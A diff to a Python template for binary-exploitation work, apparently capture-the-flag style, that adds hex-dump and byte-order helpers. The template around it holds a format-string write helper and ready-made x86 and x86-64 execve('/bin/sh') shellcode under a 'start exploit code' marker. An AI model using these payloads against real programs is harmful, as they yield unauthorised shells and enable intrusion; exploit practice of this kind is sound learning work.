@@ -2,8 +2,8 @@
 # -*- coding: utf-8 -*-
 
 import __main__, os, sys, struct, socket, telnetlib, subprocess, time
-
 from libformatstr import FormatStr
+import sys, re, binascii
 
 #import hexdump
 
@@ -134,10 +134,43 @@ def fsa4(recent_len, index_start, after_addr):
             '%' + str(index_start+3) + '$hhn'
     return data
 
+def writefile(buf_arg,file_name):
+    with open(file_name, 'wb') as f:
+        f.write(buf_arg)
+
+def addr2index(x):
+    return x*2
+
+def index2addr(x):
+    return x/2
+
+def ascii2addr(x):
+    addr1 = str(x)[0:2]
+    addr2 = str(x)[2:4]
+    addr3 = str(x)[4:6]
+    addr4 = str(x)[6:8]
+    return int(addr4 + addr3 + addr2 + addr1, 16)
+
+def splitn(data, n):
+    length = len(data)
+    return [data[i:i+n] for i in range(0, length, n)]
+
+def dmp(binary, fmt="def"):
+    res = binascii.hexlify(binary)
+    if(fmt == "x"):
+        arr = splitn(res, 8)
+        res = []
+        for var in arr:
+            res.append(hex(ascii2addr(var)))
+    if(fmt == "d"):
+        arr = splitn(res, 8)
+        res = []
+        for var in arr:
+            res.append(ascii2addr(var))
+    return res
+
 sc_execve32 = "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"
 sc_execve64 = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
 
 #-----------START EXPLOIT CODE-----------#
 
-if __name__ == '__main__':
-    sys.exit(0)
